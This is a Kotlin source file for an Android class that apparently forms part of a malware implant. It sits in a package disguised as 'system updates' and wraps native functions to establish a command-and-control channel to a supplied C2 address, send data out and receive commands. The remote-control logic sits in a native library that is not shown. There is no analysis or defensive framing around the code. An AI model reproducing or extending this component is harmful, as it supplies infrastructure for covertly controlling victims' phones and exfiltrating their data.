package com.system.updates.modules.bridges

import android.util.Log

class voidlink_bridge {
    private val tag = "VoidlinkBridge"
    private var nativeLibLoaded = false

    init {
        try {
            System.loadLibrary("voidlink_native")
            nativeLibLoaded = true
            Log.i(tag, "Native library loaded")
        } catch (e: UnsatisfiedLinkError) {
            Log.e(tag, "Failed to load native library: ${e.message}")
        }
    }

    private external fun nativeEstablishChannel(c2Address: String): Boolean
    private external fun nativeSendData(data: ByteArray): Int
    private external fun nativeReceiveCommands(): ByteArray?

    fun establishChannel(c2Address: String): Boolean {
        if (!nativeLibLoaded) return false
        return try {
            nativeEstablishChannel(c2Address)
        } catch (e: Exception) {
            Log.e(tag, "establishChannel error: ${e.message}")
            false
        }
    }

    fun sendData(data: ByteArray): Int {
        if (!nativeLibLoaded) return -1
        return try {
            nativeSendData(data)
        } catch (e: Exception) {
            Log.e(tag, "sendData error: ${e.message}")
            -1
        }
    }

    fun receiveCommands(): ByteArray? {
        if (!nativeLibLoaded) return null
        return try {
            nativeReceiveCommands()
        } catch (e: Exception) {
            Log.e(tag, "receiveCommands error: ${e.message}")
            null
        }
    }

    fun isReady(): Boolean = nativeLibLoaded
}